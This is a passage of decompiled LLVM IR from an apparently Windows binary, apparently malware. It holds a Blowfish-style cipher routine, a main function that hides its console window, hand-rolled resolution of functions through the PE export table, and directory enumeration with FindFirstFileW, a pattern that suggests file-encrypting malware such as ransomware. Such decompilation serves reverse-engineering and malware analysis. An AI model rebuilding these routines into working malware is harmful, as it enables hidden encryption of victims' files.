  %310 = mul i32 %304, 4, !insn.addr !719
  %311 = add i32 %310, %34, !insn.addr !719
  %312 = inttoptr i32 %311 to i32*, !insn.addr !719
  %313 = load i32, i32* %312, align 4, !insn.addr !719
  %314 = add i32 %313, %309, !insn.addr !719
  %315 = udiv i32 %303, 64
  %316 = and i32 %315, 1020, !insn.addr !720
  %317 = add i32 %316, %46, !insn.addr !720
  %318 = inttoptr i32 %317 to i32*, !insn.addr !720
  %319 = load i32, i32* %318, align 4, !insn.addr !720
  %320 = xor i32 %314, %319, !insn.addr !720
  %321 = mul i32 %303, 4, !insn.addr !721
  %322 = and i32 %321, 1020, !insn.addr !722
  %323 = add i32 %322, %53, !insn.addr !722
  %324 = inttoptr i32 %323 to i32*, !insn.addr !722
  %325 = load i32, i32* %324, align 4, !insn.addr !722
  %326 = add i32 %320, %325, !insn.addr !722
  %327 = xor i32 %326, %275, !insn.addr !723
  %328 = add i32 %arg1, 28, !insn.addr !724
  %329 = inttoptr i32 %328 to i32*, !insn.addr !724
  %330 = load i32, i32* %329, align 4, !insn.addr !724
  %331 = xor i32 %327, %330, !insn.addr !725
  %332 = udiv i32 %331, 16777216, !insn.addr !726
  %333 = udiv i32 %331, 16384
  %334 = and i32 %333, 1020, !insn.addr !727
  %335 = add i32 %334, %29, !insn.addr !727
  %336 = inttoptr i32 %335 to i32*, !insn.addr !727
  %337 = load i32, i32* %336, align 4, !insn.addr !727
  %338 = mul i32 %332, 4, !insn.addr !728
  %339 = add i32 %338, %34, !insn.addr !728
  %340 = inttoptr i32 %339 to i32*, !insn.addr !728
  %341 = load i32, i32* %340, align 4, !insn.addr !728
  %342 = add i32 %341, %337, !insn.addr !728
  %343 = udiv i32 %331, 64
  %344 = and i32 %343, 1020, !insn.addr !729
  %345 = add i32 %344, %46, !insn.addr !729
  %346 = inttoptr i32 %345 to i32*, !insn.addr !729
  %347 = load i32, i32* %346, align 4, !insn.addr !729
  %348 = xor i32 %342, %347, !insn.addr !729
  %349 = mul i32 %331, 4, !insn.addr !730
  %350 = and i32 %349, 1020, !insn.addr !731
  %351 = add i32 %350, %53, !insn.addr !731
  %352 = inttoptr i32 %351 to i32*, !insn.addr !731
  %353 = load i32, i32* %352, align 4, !insn.addr !731
  %354 = add i32 %348, %353, !insn.addr !731
  %355 = xor i32 %354, %303, !insn.addr !732
  %356 = add i32 %arg1, 24, !insn.addr !733
  %357 = inttoptr i32 %356 to i32*, !insn.addr !733
  %358 = load i32, i32* %357, align 4, !insn.addr !733
  %359 = xor i32 %355, %358, !insn.addr !734
  %360 = udiv i32 %359, 16777216, !insn.addr !735
  %361 = udiv i32 %359, 16384
  %362 = and i32 %361, 1020, !insn.addr !736
  %363 = add i32 %362, %29, !insn.addr !736
  %364 = inttoptr i32 %363 to i32*, !insn.addr !736
  %365 = load i32, i32* %364, align 4, !insn.addr !736
  %366 = mul i32 %360, 4, !insn.addr !737
  %367 = add i32 %366, %34, !insn.addr !737
  %368 = inttoptr i32 %367 to i32*, !insn.addr !737
  %369 = load i32, i32* %368, align 4, !insn.addr !737
  %370 = add i32 %369, %365, !insn.addr !737
  %371 = udiv i32 %359, 64
  %372 = and i32 %371, 1020, !insn.addr !738
  %373 = add i32 %372, %46, !insn.addr !738
  %374 = inttoptr i32 %373 to i32*, !insn.addr !738
  %375 = load i32, i32* %374, align 4, !insn.addr !738
  %376 = xor i32 %370, %375, !insn.addr !738
  %377 = mul i32 %359, 4, !insn.addr !739
  %378 = and i32 %377, 1020, !insn.addr !740
  %379 = add i32 %378, %53, !insn.addr !740
  %380 = inttoptr i32 %379 to i32*, !insn.addr !740
  %381 = load i32, i32* %380, align 4, !insn.addr !740
  %382 = add i32 %376, %381, !insn.addr !740
  %383 = xor i32 %382, %331, !insn.addr !741
  %384 = add i32 %arg1, 20, !insn.addr !742
  %385 = inttoptr i32 %384 to i32*, !insn.addr !742
  %386 = load i32, i32* %385, align 4, !insn.addr !742
  %387 = xor i32 %383, %386, !insn.addr !743
  %388 = udiv i32 %387, 16777216, !insn.addr !744
  %389 = udiv i32 %387, 16384
  %390 = and i32 %389, 1020, !insn.addr !745
  %391 = add i32 %390, %29, !insn.addr !745
  %392 = inttoptr i32 %391 to i32*, !insn.addr !745
  %393 = load i32, i32* %392, align 4, !insn.addr !745
  %394 = mul i32 %388, 4, !insn.addr !746
  %395 = add i32 %394, %34, !insn.addr !746
  %396 = inttoptr i32 %395 to i32*, !insn.addr !746
  %397 = load i32, i32* %396, align 4, !insn.addr !746
  %398 = add i32 %397, %393, !insn.addr !746
  %399 = udiv i32 %387, 64
  %400 = and i32 %399, 1020, !insn.addr !747
  %401 = add i32 %400, %46, !insn.addr !747
  %402 = inttoptr i32 %401 to i32*, !insn.addr !747
  %403 = load i32, i32* %402, align 4, !insn.addr !747
  %404 = xor i32 %398, %403, !insn.addr !747
  %405 = mul i32 %387, 4, !insn.addr !748
  %406 = and i32 %405, 1020, !insn.addr !749
  %407 = add i32 %406, %53, !insn.addr !749
  %408 = inttoptr i32 %407 to i32*, !insn.addr !749
  %409 = load i32, i32* %408, align 4, !insn.addr !749
  %410 = add i32 %404, %409, !insn.addr !749
  %411 = xor i32 %410, %359, !insn.addr !750
  %412 = add i32 %arg1, 16, !insn.addr !751
  %413 = inttoptr i32 %412 to i32*, !insn.addr !751
  %414 = load i32, i32* %413, align 4, !insn.addr !751
  %415 = xor i32 %411, %414, !insn.addr !752
  %416 = udiv i32 %415, 16777216, !insn.addr !753
  %417 = udiv i32 %415, 16384
  %418 = and i32 %417, 1020, !insn.addr !754
  %419 = add i32 %418, %29, !insn.addr !754
  %420 = inttoptr i32 %419 to i32*, !insn.addr !754
  %421 = load i32, i32* %420, align 4, !insn.addr !754
  %422 = mul i32 %416, 4, !insn.addr !755
  %423 = add i32 %422, %34, !insn.addr !755
  %424 = inttoptr i32 %423 to i32*, !insn.addr !755
  %425 = load i32, i32* %424, align 4, !insn.addr !755
  %426 = add i32 %425, %421, !insn.addr !755
  %427 = udiv i32 %415, 64
  %428 = and i32 %427, 1020, !insn.addr !756
  %429 = add i32 %428, %46, !insn.addr !756
  %430 = inttoptr i32 %429 to i32*, !insn.addr !756
  %431 = load i32, i32* %430, align 4, !insn.addr !756
  %432 = xor i32 %426, %431, !insn.addr !756
  %433 = mul i32 %415, 4, !insn.addr !757
  %434 = and i32 %433, 1020, !insn.addr !758
  %435 = add i32 %434, %53, !insn.addr !758
  %436 = inttoptr i32 %435 to i32*, !insn.addr !758
  %437 = load i32, i32* %436, align 4, !insn.addr !758
  %438 = add i32 %432, %437, !insn.addr !758
  %439 = xor i32 %438, %387, !insn.addr !759
  %440 = add i32 %arg1, 12, !insn.addr !760
  %441 = inttoptr i32 %440 to i32*, !insn.addr !760
  %442 = load i32, i32* %441, align 4, !insn.addr !760
  %443 = xor i32 %439, %442, !insn.addr !761
  %444 = udiv i32 %443, 16777216, !insn.addr !762
  %445 = udiv i32 %443, 16384
  %446 = and i32 %445, 1020, !insn.addr !763
  %447 = add i32 %446, %29, !insn.addr !763
  %448 = inttoptr i32 %447 to i32*, !insn.addr !763
  %449 = load i32, i32* %448, align 4, !insn.addr !763
  %450 = mul i32 %444, 4, !insn.addr !764
  %451 = add i32 %450, %34, !insn.addr !764
  %452 = inttoptr i32 %451 to i32*, !insn.addr !764
  %453 = load i32, i32* %452, align 4, !insn.addr !764
  %454 = add i32 %453, %449, !insn.addr !764
  %455 = udiv i32 %443, 64
  %456 = and i32 %455, 1020, !insn.addr !765
  %457 = add i32 %456, %46, !insn.addr !765
  %458 = inttoptr i32 %457 to i32*, !insn.addr !765
  %459 = load i32, i32* %458, align 4, !insn.addr !765
  %460 = xor i32 %454, %459, !insn.addr !765
  %461 = add i32 %arg1, 8, !insn.addr !766
  %462 = inttoptr i32 %461 to i32*, !insn.addr !766
  %463 = load i32, i32* %462, align 4, !insn.addr !766
  %464 = mul i32 %443, 4, !insn.addr !767
  %465 = and i32 %464, 1020, !insn.addr !768
  %466 = add i32 %465, %53, !insn.addr !768
  %467 = inttoptr i32 %466 to i32*, !insn.addr !768
  %468 = load i32, i32* %467, align 4, !insn.addr !768
  %469 = add i32 %468, %460, !insn.addr !768
  %470 = xor i32 %463, %415, !insn.addr !769
  %471 = xor i32 %470, %469, !insn.addr !770
  %472 = udiv i32 %471, 16777216, !insn.addr !771
  %473 = udiv i32 %471, 16384
  %474 = and i32 %473, 1020, !insn.addr !772
  %475 = add i32 %474, %29, !insn.addr !772
  %476 = inttoptr i32 %475 to i32*, !insn.addr !772
  %477 = load i32, i32* %476, align 4, !insn.addr !772
  %478 = mul i32 %472, 4, !insn.addr !773
  %479 = add i32 %478, %34, !insn.addr !773
  %480 = inttoptr i32 %479 to i32*, !insn.addr !773
  %481 = load i32, i32* %480, align 4, !insn.addr !773
  %482 = add i32 %481, %477, !insn.addr !773
  %483 = udiv i32 %471, 64
  %484 = and i32 %483, 1020, !insn.addr !774
  %485 = add i32 %484, %46, !insn.addr !774
  %486 = inttoptr i32 %485 to i32*, !insn.addr !774
  %487 = load i32, i32* %486, align 4, !insn.addr !774
  %488 = xor i32 %482, %487, !insn.addr !774
  %489 = inttoptr i32 %arg1 to i32*, !insn.addr !775
  %490 = load i32, i32* %489, align 4, !insn.addr !775
  %491 = xor i32 %490, %471, !insn.addr !775
  %492 = mul i32 %471, 4, !insn.addr !776
  %493 = and i32 %492, 1020, !insn.addr !777
  %494 = add i32 %493, %53, !insn.addr !777
  %495 = inttoptr i32 %494 to i32*, !insn.addr !777
  %496 = load i32, i32* %495, align 4, !insn.addr !777
  %497 = add i32 %496, %488, !insn.addr !777
  %498 = add i32 %arg1, 4, !insn.addr !778
  %499 = inttoptr i32 %498 to i32*, !insn.addr !778
  %500 = load i32, i32* %499, align 4, !insn.addr !778
  %501 = xor i32 %500, %443, !insn.addr !778
  %502 = xor i32 %501, %497, !insn.addr !779
  %503 = udiv i32 %491, 16777216, !insn.addr !780
  %504 = trunc i32 %503 to i8, !insn.addr !781
  store i8 %504, i8* %2, align 1, !insn.addr !781
  %505 = udiv i32 %491, 65536, !insn.addr !782
  %506 = trunc i32 %505 to i8, !insn.addr !783
  %507 = add i32 %0, 1, !insn.addr !783
  %508 = inttoptr i32 %507 to i8*, !insn.addr !783
  store i8 %506, i8* %508, align 1, !insn.addr !783
  %509 = udiv i32 %491, 256, !insn.addr !784
  %510 = trunc i32 %509 to i8, !insn.addr !785
  %511 = add i32 %0, 2, !insn.addr !785
  %512 = inttoptr i32 %511 to i8*, !insn.addr !785
  store i8 %510, i8* %512, align 1, !insn.addr !785
  %513 = udiv i32 %502, 16777216, !insn.addr !786
  %514 = trunc i32 %513 to i8, !insn.addr !787
  %515 = add i32 %0, 4, !insn.addr !787
  %516 = inttoptr i32 %515 to i8*, !insn.addr !787
  store i8 %514, i8* %516, align 1, !insn.addr !787
  %517 = udiv i32 %502, 65536, !insn.addr !788
  %518 = trunc i32 %517 to i8, !insn.addr !789
  %519 = add i32 %0, 5, !insn.addr !789
  %520 = inttoptr i32 %519 to i8*, !insn.addr !789
  store i8 %518, i8* %520, align 1, !insn.addr !789
  %521 = udiv i32 %502, 256, !insn.addr !790
  %522 = trunc i32 %491 to i8, !insn.addr !791
  %523 = add i32 %0, 3, !insn.addr !791
  %524 = inttoptr i32 %523 to i8*, !insn.addr !791
  store i8 %522, i8* %524, align 1, !insn.addr !791
  %525 = trunc i32 %521 to i8, !insn.addr !792
  %526 = add i32 %0, 6, !insn.addr !792
  %527 = inttoptr i32 %526 to i8*, !insn.addr !792
  store i8 %525, i8* %527, align 1, !insn.addr !792
  %528 = trunc i32 %502 to i8, !insn.addr !793
  %529 = add i32 %0, 7, !insn.addr !793
  %530 = inttoptr i32 %529 to i8*, !insn.addr !793
  store i8 %528, i8* %530, align 1, !insn.addr !793
  ret i32 %521, !insn.addr !794
}

define i32 @function_406d30() local_unnamed_addr {
dec_label_pc_406d30:
  %edi.0.reg2mem = alloca i32, !insn.addr !795
  %esi.3.reg2mem = alloca i32, !insn.addr !795
  %esi.2.reg2mem = alloca i32, !insn.addr !795
  %stack_var_-12.1.reg2mem = alloca i32, !insn.addr !795
  %esi.1.reg2mem = alloca i32, !insn.addr !795
  %esi.0.reg2mem = alloca i32, !insn.addr !795
  %stack_var_-12.0.reg2mem = alloca i32, !insn.addr !795
  %edx = alloca i32, align 8
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i8 @__decompiler_undefined_function_7()
  %3 = call i8 @__decompiler_undefined_function_7()
  %4 = call i8 @__decompiler_undefined_function_7()
  %5 = call i8 @__decompiler_undefined_function_7()
  %stack_var_-32 = alloca i32, align 4
  %6 = call i128 @__asm_movdqu(i128 4571559106041210102030882632605067912), !insn.addr !796
  %7 = bitcast i32* %edx to i128*
  %8 = load i128, i128* %7, align 8, !insn.addr !797
  call void @__asm_movdqu.10(i128 %8, i128 %6), !insn.addr !797
  %9 = load i128, i128* @global_var_422f78, align 4, !insn.addr !798
  %10 = call i128 @__asm_movdqu(i128 %9), !insn.addr !798
  %11 = add i32 %0, 16, !insn.addr !799
  %12 = inttoptr i32 %11 to i128*, !insn.addr !799
  %13 = load i128, i128* %12, align 4, !insn.addr !799
  call void @__asm_movdqu.10(i128 %13, i128 %10), !insn.addr !799
  %14 = load i128, i128* @global_var_422f88, align 4, !insn.addr !800
  %15 = call i128 @__asm_movdqu(i128 %14), !insn.addr !800
  %16 = add i32 %0, 32, !insn.addr !801
  %17 = inttoptr i32 %16 to i128*, !insn.addr !801
  %18 = load i128, i128* %17, align 4, !insn.addr !801
  call void @__asm_movdqu.10(i128 %18, i128 %15), !insn.addr !801
  %19 = load i128, i128* @global_var_422f98, align 4, !insn.addr !802
  %20 = call i128 @__asm_movdqu(i128 %19), !insn.addr !802
  %21 = add i32 %0, 48, !insn.addr !803
  %22 = inttoptr i32 %21 to i128*, !insn.addr !803
  %23 = load i128, i128* %22, align 4, !insn.addr !803
  call void @__asm_movdqu.10(i128 %23, i128 %20), !insn.addr !803
  %24 = call i128 @__asm_movq(i64 -8540519122497776167), !insn.addr !804
  %25 = add i32 %0, 64, !insn.addr !805
  %26 = inttoptr i32 %25 to i64*, !insn.addr !805
  %27 = load i64, i64* %26, align 4, !insn.addr !805
  call void @__asm_movq.9(i64 %27, i128 %24), !insn.addr !805
  %28 = call i32 @_memcpy.1(), !insn.addr !806
  store i32 0, i32* %stack_var_-12.0.reg2mem, !insn.addr !807
  store i32 2, i32* %esi.0.reg2mem, !insn.addr !807
  br label %dec_label_pc_406db7, !insn.addr !807

dec_label_pc_406db7:                              ; preds = %dec_label_pc_406db7, %dec_label_pc_406d30
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %stack_var_-12.0.reload = load i32, i32* %stack_var_-12.0.reg2mem
  %29 = add nsw i32 %esi.0.reload, -2, !insn.addr !808
  %30 = ashr i32 %29, 31, !insn.addr !809
  %31 = zext i32 %29 to i64, !insn.addr !810
  %32 = zext i32 %30 to i64, !insn.addr !810
  %33 = mul i64 %32, 4294967296, !insn.addr !810
  %34 = or i64 %33, %31, !insn.addr !810
  %35 = srem i64 %34, 24, !insn.addr !810
  %36 = trunc i64 %35 to i32, !insn.addr !810
  %37 = add nsw i32 %esi.0.reload, -1, !insn.addr !811
  %38 = add i32 %1, %36, !insn.addr !812
  %39 = inttoptr i32 %38 to i8*, !insn.addr !812
  %40 = load i8, i8* %39, align 1, !insn.addr !812
  %41 = zext i8 %40 to i32, !insn.addr !812
  %42 = ashr i32 %37, 31, !insn.addr !813
  %43 = zext i32 %37 to i64, !insn.addr !814
  %44 = zext i32 %42 to i64, !insn.addr !814
  %45 = mul i64 %44, 4294967296, !insn.addr !814
  %46 = or i64 %45, %43, !insn.addr !814
  %47 = srem i64 %46, 24, !insn.addr !814
  %48 = trunc i64 %47 to i32, !insn.addr !814
  %49 = mul i32 %41, 256, !insn.addr !815
  %50 = add i32 %1, %48, !insn.addr !816
  %51 = inttoptr i32 %50 to i8*, !insn.addr !816
  %52 = load i8, i8* %51, align 1, !insn.addr !816
  %53 = zext i8 %52 to i32, !insn.addr !816
  %54 = or i32 %49, %53, !insn.addr !817
  %55 = urem i32 %esi.0.reload, 24
  %56 = mul i32 %54, 256, !insn.addr !818
  %57 = add i32 %55, %1, !insn.addr !819
  %58 = inttoptr i32 %57 to i8*, !insn.addr !819
  %59 = load i8, i8* %58, align 1, !insn.addr !819
  %60 = zext i8 %59 to i32, !insn.addr !819
  %61 = or i32 %56, %60, !insn.addr !820
  %62 = or i32 %esi.0.reload, 1, !insn.addr !821
  %63 = add nuw nsw i32 %esi.0.reload, 4, !insn.addr !822
  %64 = urem i32 %62, 24
  %65 = mul i32 %61, 256, !insn.addr !823
  %66 = add i32 %64, %1, !insn.addr !824
  %67 = inttoptr i32 %66 to i8*, !insn.addr !824
  %68 = load i8, i8* %67, align 1, !insn.addr !824
  %69 = zext i8 %68 to i32, !insn.addr !824
  %70 = or i32 %65, %69, !insn.addr !825
  %71 = mul i32 %stack_var_-12.0.reload, 4, !insn.addr !826
  %72 = add i32 %71, %0, !insn.addr !826
  %73 = inttoptr i32 %72 to i32*, !insn.addr !826
  %74 = load i32, i32* %73, align 4, !insn.addr !826
  %75 = xor i32 %70, %74, !insn.addr !826
  store i32 %75, i32* %73, align 4, !insn.addr !826
  %76 = add nuw nsw i32 %stack_var_-12.0.reload, 1, !insn.addr !827
  %exitcond = icmp eq i32 %76, 18
  store i32 %76, i32* %stack_var_-12.0.reg2mem, !insn.addr !828
  store i32 %63, i32* %esi.0.reg2mem, !insn.addr !828
  br i1 %exitcond, label %dec_label_pc_406e07, label %dec_label_pc_406db7, !insn.addr !828

dec_label_pc_406e07:                              ; preds = %dec_label_pc_406db7
  %77 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !829
  %78 = add i32 %77, -4, !insn.addr !830
  %79 = inttoptr i32 %78 to i32*
  %80 = zext i8 %5 to i32
  %81 = zext i8 %4 to i32
  %82 = mul i32 %80, 256
  %83 = or i32 %82, %81
  %84 = zext i8 %3 to i32
  %85 = mul i32 %84, 65536
  %86 = zext i8 %2 to i32
  %87 = or i32 %85, %86
  %88 = mul i32 %87, 256
  store i32 0, i32* %esi.1.reg2mem, !insn.addr !829
  br label %dec_label_pc_406e10, !insn.addr !829

dec_label_pc_406e10:                              ; preds = %dec_label_pc_406e10, %dec_label_pc_406e07
  %esi.1.reload = load i32, i32* %esi.1.reg2mem
  %89 = call i32 @function_406470(i32 ptrtoint (i32* @0 to i32)), !insn.addr !831
  %90 = mul i32 %esi.1.reload, 4, !insn.addr !832
  %91 = add i32 %90, %0
  %92 = inttoptr i32 %91 to i32*, !insn.addr !832
  store i32 %83, i32* %92, align 4, !insn.addr !832
  %93 = add i32 %91, 4, !insn.addr !833
  %94 = inttoptr i32 %93 to i32*, !insn.addr !833
  store i32 %88, i32* %94, align 4, !insn.addr !833
  %95 = add nuw nsw i32 %esi.1.reload, 2, !insn.addr !834
  %96 = icmp ult i32 %95, 18, !insn.addr !835
  store i32 %95, i32* %esi.1.reg2mem, !insn.addr !835
  br i1 %96, label %dec_label_pc_406e10, label %dec_label_pc_406e6b, !insn.addr !835

dec_label_pc_406e6b:                              ; preds = %dec_label_pc_406e10
  %97 = add i32 %0, 76, !insn.addr !836
  store i32 4, i32* %stack_var_-12.1.reg2mem, !insn.addr !837
  store i32 %97, i32* %esi.2.reg2mem, !insn.addr !837
  br label %dec_label_pc_406e75, !insn.addr !837

dec_label_pc_406e75:                              ; preds = %dec_label_pc_406ed7, %dec_label_pc_406e6b
  %esi.2.reload = load i32, i32* %esi.2.reg2mem
  %stack_var_-12.1.reload = load i32, i32* %stack_var_-12.1.reg2mem
  store i32 %esi.2.reload, i32* %esi.3.reg2mem, !insn.addr !838
  store i32 128, i32* %edi.0.reg2mem, !insn.addr !838
  br label %dec_label_pc_406e80, !insn.addr !838

dec_label_pc_406e80:                              ; preds = %dec_label_pc_406e80, %dec_label_pc_406e75
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %esi.3.reload = load i32, i32* %esi.3.reg2mem
  %98 = call i32 @function_406470(i32 ptrtoint (i32* @0 to i32)), !insn.addr !839
  %99 = add i32 %esi.3.reload, -4, !insn.addr !840
  %100 = inttoptr i32 %99 to i32*, !insn.addr !840
  store i32 %83, i32* %100, align 4, !insn.addr !840
  %101 = inttoptr i32 %esi.3.reload to i32*, !insn.addr !841
  store i32 %88, i32* %101, align 4, !insn.addr !841
  %102 = add i32 %esi.3.reload, 8, !insn.addr !842
  %103 = add i32 %edi.0.reload, -1, !insn.addr !843
  %104 = icmp eq i32 %103, 0, !insn.addr !843
  %105 = icmp eq i1 %104, false, !insn.addr !844
  store i32 %102, i32* %esi.3.reg2mem, !insn.addr !844
  store i32 %103, i32* %edi.0.reg2mem, !insn.addr !844
  br i1 %105, label %dec_label_pc_406e80, label %dec_label_pc_406ed7, !insn.addr !844

dec_label_pc_406ed7:                              ; preds = %dec_label_pc_406e80
  %106 = add nsw i32 %stack_var_-12.1.reload, -1, !insn.addr !845
  %107 = icmp eq i32 %106, 0, !insn.addr !845
  %108 = icmp eq i1 %107, false, !insn.addr !846
  store i32 %106, i32* %stack_var_-12.1.reg2mem, !insn.addr !846
  store i32 %102, i32* %esi.2.reg2mem, !insn.addr !846
  br i1 %108, label %dec_label_pc_406e75, label %dec_label_pc_406edc, !insn.addr !846

dec_label_pc_406edc:                              ; preds = %dec_label_pc_406ed7
  ret i32 0, !insn.addr !847
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
dec_label_pc_406ef0:
  %0 = call i32* @GetConsoleWindow(), !insn.addr !848
  %1 = call i1 @ShowWindow(i32* %0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !849
  %2 = call i32 @function_40a7f0(i32 ptrtoint (i32* @0 to i32)), !insn.addr !850
  ret i32 0, !insn.addr !851
}

define i32 @function_406f10() local_unnamed_addr {
dec_label_pc_406f10:
  %esi.1.reg2mem = alloca i32, !insn.addr !852
  %esi.0.reg2mem = alloca i32, !insn.addr !852
  %esp.0.reg2mem = alloca i32, !insn.addr !852
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %1 = add i32 %0, 60, !insn.addr !853
  %2 = inttoptr i32 %1 to i32*, !insn.addr !853
  %3 = load i32, i32* %2, align 4, !insn.addr !853
  %4 = add i32 %0, 120, !insn.addr !854
  %5 = add i32 %4, %3, !insn.addr !854
  %6 = inttoptr i32 %5 to i32*, !insn.addr !854
  %7 = load i32, i32* %6, align 4, !insn.addr !854
  %8 = add i32 %7, %0, !insn.addr !855
  %9 = add i32 %8, 32, !insn.addr !856
  %10 = inttoptr i32 %9 to i32*, !insn.addr !856
  %11 = load i32, i32* %10, align 4, !insn.addr !856
  %12 = add i32 %8, 24, !insn.addr !857
  %13 = inttoptr i32 %12 to i32*, !insn.addr !857
  %14 = load i32, i32* %13, align 4, !insn.addr !857
  %15 = add i32 %14, -1, !insn.addr !858
  %16 = icmp slt i32 %15, 0, !insn.addr !858
  store i32 -1, i32* %esi.1.reg2mem, !insn.addr !859
  br i1 %16, label %dec_label_pc_406f4f, label %dec_label_pc_406f35.preheader, !insn.addr !859

dec_label_pc_406f35.preheader:                    ; preds = %dec_label_pc_406f10
  %17 = add i32 %11, %0, !insn.addr !860
  %18 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !861
  store i32 %18, i32* %esp.0.reg2mem
  store i32 %15, i32* %esi.0.reg2mem
  br label %dec_label_pc_406f35

dec_label_pc_406f35:                              ; preds = %dec_label_pc_406f35.preheader, %dec_label_pc_406f46
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %19 = mul i32 %esi.0.reload, 4, !insn.addr !862
  %20 = add i32 %17, %19, !insn.addr !862
  %21 = inttoptr i32 %20 to i32*, !insn.addr !862
  %22 = load i32, i32* %21, align 4, !insn.addr !862
  %23 = add i32 %22, %0, !insn.addr !863
  %24 = add i32 %esp.0.reload, -8, !insn.addr !864
  %25 = inttoptr i32 %24 to i32*, !insn.addr !864
  store i32 %23, i32* %25, align 4, !insn.addr !864
  %26 = call i32 @lstrcmpA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !865
  %27 = icmp eq i32 %26, 0, !insn.addr !866
  store i32 %esi.0.reload, i32* %esi.1.reg2mem, !insn.addr !867
  br i1 %27, label %dec_label_pc_406f4f, label %dec_label_pc_406f46, !insn.addr !867

dec_label_pc_406f46:                              ; preds = %dec_label_pc_406f35
  %28 = add i32 %esp.0.reload, -4, !insn.addr !868
  %29 = inttoptr i32 %28 to i32*, !insn.addr !868
  %30 = add i32 %esi.0.reload, -1, !insn.addr !869
  %31 = icmp slt i32 %30, 0, !insn.addr !869
  %32 = icmp eq i1 %31, false, !insn.addr !870
  store i32 %24, i32* %esp.0.reg2mem, !insn.addr !870
  store i32 %30, i32* %esi.0.reg2mem, !insn.addr !870
  store i32 -1, i32* %esi.1.reg2mem, !insn.addr !870
  br i1 %32, label %dec_label_pc_406f35, label %dec_label_pc_406f4f, !insn.addr !870

dec_label_pc_406f4f:                              ; preds = %dec_label_pc_406f46, %dec_label_pc_406f35, %dec_label_pc_406f10
  %esi.1.reload = load i32, i32* %esi.1.reg2mem
  %33 = add i32 %8, 36, !insn.addr !871
  %34 = inttoptr i32 %33 to i32*, !insn.addr !871
  %35 = load i32, i32* %34, align 4, !insn.addr !871
  %36 = mul i32 %esi.1.reload, 2, !insn.addr !872
  %37 = add i32 %36, %0, !insn.addr !872
  %38 = add i32 %37, %35, !insn.addr !873
  %39 = inttoptr i32 %38 to i16*, !insn.addr !873
  %40 = load i16, i16* %39, align 2, !insn.addr !873
  %41 = zext i16 %40 to i32, !insn.addr !873
  %42 = add i32 %8, 28, !insn.addr !874
  %43 = inttoptr i32 %42 to i32*, !insn.addr !874
  %44 = load i32, i32* %43, align 4, !insn.addr !874
  %45 = mul i32 %41, 4, !insn.addr !875
  %46 = add i32 %44, %0, !insn.addr !875
  %47 = add i32 %46, %45, !insn.addr !876
  %48 = inttoptr i32 %47 to i32*, !insn.addr !876
  %49 = load i32, i32* %48, align 4, !insn.addr !876
  %50 = add i32 %49, %0, !insn.addr !877
  ret i32 %50, !insn.addr !878
}

define i32 @function_408cb0() local_unnamed_addr {
dec_label_pc_408cb0:
  %esp.2.reg2mem = alloca i32, !insn.addr !879
  %esp.1.reg2mem = alloca i32, !insn.addr !879
  %esp.0.reg2mem = alloca i32, !insn.addr !879
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8808 = alloca i32, align 4
  %stack_var_-8204 = alloca i32, align 4
  %stack_var_-8752 = alloca i32, align 4
  %stack_var_-8796 = alloca i8, align 1
  %stack_var_-24 = alloca i16*, align 4
  %stack_var_-4108 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %1 = call i32 @__chkstk(), !insn.addr !880
  %2 = inttoptr i32 %0 to i16*, !insn.addr !881
  %3 = call i32 (i16*, i16*, ...) @wsprintfW(i16* %2, i16* bitcast (i32* @0 to i16*)), !insn.addr !881
  %4 = bitcast i8* %stack_var_-8796 to %_WIN32_FIND_DATAW*
  %5 = bitcast i32* %stack_var_-4108 to i16*
  store i16* %5, i16** %stack_var_-24, align 4, !insn.addr !882
  %6 = call i32* @FindFirstFileW(i16* nonnull %5, %_WIN32_FIND_DATAW* nonnull %4), !insn.addr !883
  %7 = icmp eq i32* %6, inttoptr (i32 -1 to i32*), !insn.addr !884
  %8 = icmp eq i1 %7, false, !insn.addr !885
  br i1 %8, label %dec_label_pc_408d30.preheader, label %dec_label_pc_408d09, !insn.addr !885

dec_label_pc_408d30.preheader:                    ; preds = %dec_label_pc_408cb0
  %9 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !886
  %10 = ptrtoint i32* %6 to i32, !insn.addr !883
  %11 = ptrtoint i16** %stack_var_-24 to i32, !insn.addr !882
  %12 = ptrtoint i32* %stack_var_-8752 to i32, !insn.addr !887
  %13 = ptrtoint i32* %stack_var_-4108 to i32
  %14 = add i32 %9, -8756
  %15 = add i32 %9, -8758
  %16 = ptrtoint i32* %stack_var_-8204 to i32
  %17 = ptrtoint i32* %stack_var_-8808 to i32
  %18 = ptrtoint i8* %stack_var_-8796 to i32
  store i32 %11, i32* %esp.0.reg2mem
  br label %dec_label_pc_408d30

dec_label_pc_408d09:                              ; preds = %dec_label_pc_408cb0
  %19 = call i32 @"@__security_check_cookie@4"(), !insn.addr !888
  ret i32 %19, !insn.addr !889

dec_label_pc_408d30:                              ; preds = %dec_label_pc_408d30.preheader, %dec_label_pc_408ef0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %20 = add i32 %esp.0.reload, -4, !insn.addr !890
  %21 = inttoptr i32 %20 to i32*, !insn.addr !890
  store i32 ptrtoint (i32* @global_var_425920 to i32), i32* %21, align 4, !insn.addr !890
  %22 = add i32 %esp.0.reload, -8, !insn.addr !887
  %23 = inttoptr i32 %22 to i32*, !insn.addr !887
  store i32 %12, i32* %23, align 4, !insn.addr !887
  %24 = call i32 @lstrcmpW(i16* bitcast (i32* @0 to i16*), i16* bitcast (i32* @0 to i16*)), !insn.addr !891
  %25 = icmp eq i32 %24, 0, !insn.addr !892
  store i32 %22, i32* %esp.2.reg2mem, !insn.addr !893
  br i1 %25, label %dec_label_pc_408ef0, label %dec_label_pc_408d46, !insn.addr !893

dec_label_pc_408d46:                              ; preds = %dec_label_pc_408d30
  %26 = add i32 %esp.0.reload, -12, !insn.addr !894
